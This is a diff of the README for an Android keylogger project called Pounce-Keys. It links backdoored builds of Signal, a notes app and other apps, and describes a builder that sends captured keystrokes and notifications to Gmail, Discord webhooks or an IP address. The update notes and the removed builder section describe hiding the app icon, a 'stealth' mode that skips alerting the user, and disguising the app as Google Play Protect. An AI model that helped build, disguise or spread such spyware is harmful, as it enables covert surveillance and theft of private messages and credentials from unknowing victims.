@@ -3,7 +3,6 @@
 ![GitHub commit activity](https://img.shields.io/github/commit-activity/y/NullPounce/Pounce-Keys) 
 ![GitHub](https://img.shields.io/github/license/NullPounce/Pounce-Keys)     
 ![Linode](https://img.shields.io/badge/GMAIL-DISCORD-green)
-<a href='https://ko-fi.com/X8X6I1K9I' target='_blank'><img height='36' style='border:0px;height:36px;' src='https://storage.ko-fi.com/cdn/kofi1.png?v=3' border='0' alt='Buy Me a Coffee at ko-fi.com' /></a>
 
 
 
@@ -28,16 +27,15 @@
   </p>
 </div>
 
-Scroll down to "Manual Building" for a video guide
+<a href="https://www.buymeacoffee.com/NullPounce"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee <3&emoji=&slug=NullPounce&button_colour=BD5FFF&font_colour=ffffff&font_family=Comic&outline_colour=000000&coffee_colour=FFDD00" /></a>
 
-please use APK Tool GUI if the new builder is not working, think the discord button at least is bugged too -_- "something better on the way" 
-# Download
+ 
+# Download (JKD19 required for the new builder)
+[Builder](https://github.com/NullPounce/pounce-keys/releases/tag/PounceKey's)
 
 [Signal Messenger Backdoor](https://github.com/NullPounce/pounce-keys/releases/tag/Pounce-Keys-Signal)
 
 [Notes App Backdoor](https://github.com/NullPounce/pounce-keys/releases/tag/PounceKeys-FileManager)
-
-[Builder](https://github.com/NullPounce/pounce-keys/releases/tag/PounceKey's)
 
 [Pounce-Keys-Gmail](https://github.com/NullPounce/pounce-keys/releases/tag/Pounce-Keys-Gmail)
 
@@ -45,24 +43,18 @@ please use APK Tool GUI if the new builder is not working, think the discord but
 
 [PounceKeys-IP](https://github.com/NullPounce/pounce-keys/releases/tag/2.1)
 
-# PounceKey's 2.0 update!
+# PounceKey's 3.0 update!
+- multi device sorting support
+- new GUI!
 - hidden icon up to android 13 instead of only 9
 - notifications are logged and sent again
 - system info sent on service enable
 - "should" now alert user to enable the service
 - updated the icon and text "general cleanup"
 - changed from Battery Health Service to Google Play Protect Service
-- new GUI builder
+- new GUI builder with python eel
   
-![demo](https://user-images.githubusercontent.com/28081004/216733696-e7d1c552-5884-46b2-82c9-5221f9ece36f.gif)
-
-
-
-
-https://github.com/NullPounce/pounce-keys/assets/28081004/603ae2bd-1544-444d-a177-2cf1dda98541
-
-I just fixed the bug and now the alerts go away on service enable
-
+https://github.com/NullPounce/pounce-keys/assets/28081004/4160dec0-d2b0-4705-867a-833c447ec666
 
 
 # Features 
@@ -100,33 +92,6 @@ I just fixed the bug and now the alerts go away on service enable
 ✅ you can choose: | verbose | keylogger only | keylogger and notifications | for sane readability
 
 
-
-# GUI Builder 
-requires java "see issues section for chmod/ using in linux"
-
-![Screenshot 2024-03-03 151210](https://github.com/NullPounce/pounce-keys/assets/28081004/cea5e453-c324-4498-9e65-7f5e1172eb14)
-
-**click on stealth and normal to toggle between the two "stealth means no icon on install"**
-- choosing stealth also means not alerting the user to enable the service
-- not clicking stealth or normal just defaults to "normal" non hidden
-
-**Next select either | IP | Gmail | Discord | (where you want logs sent)**
-     
-- Discord: builds apk after pressing ok and inserting webook
-- IP: builds after pressing the ok button after you select a buffer "has a verbose option tick box)
-- Gmail: builds when user click ok on the app pass screen (this new builder is close to 300 lines of code vs the orignal around 100 but it's all 3 base versions under 200 megabytes!)
-----------------------------
- **GMAIL BUG Work Around**
-
-Bug: If the user builds the IP or Discord version then th Gmail version fails to work.
-
-Cause: the code behind the Gmail button is not copying and pasting it's smali files from /apk/version/gmail/*.smali to \apk\PounceKeys-IP_Discord\smali_classes3\com\
-
-FIX: build the Gmail version first or copy and paste the files yourself or just delete what you unpacked and just unpack the rar again then build the Gmail version first,
-
-this works because the Gmail version is being used as a base
-
-
 # Manual Bulding
 
 part 1
@@ -145,11 +110,6 @@ nex open up the decompiled folder in a IDE "text editor" that supports opening a
 
 read the release notes on the vaules to replace, save it then compile with the gui
 
-# Older Builder Videos
-
-https://github.com/NullPounce/pounce-keys/assets/28081004/33575afb-68f7-4b92-b90d-3b9036e5e7fe             
-
-https://github.com/NullPounce/pounce-keys/assets/28081004/57c40085-ee6a-47c3-b27a-b2d89917d59e
 
 [Old IP version notes](https://github.com/NullPounce/pounce-keys/wiki/Old-IP-version-notes)
 
@@ -203,7 +163,7 @@ If you've found my work to be valuable, I would greatly appreciate your support,
 
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/X8X6I1K9I)
 
-<a href="https://www.buymeacoffee.com/NullPounce"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee <3&emoji=&slug=NullPounce&button_colour=BD5FFF&font_colour=ffffff&font_family=Comic&outline_colour=000000&coffee_colour=FFDD00" /></a>
+
 
 # credits
 
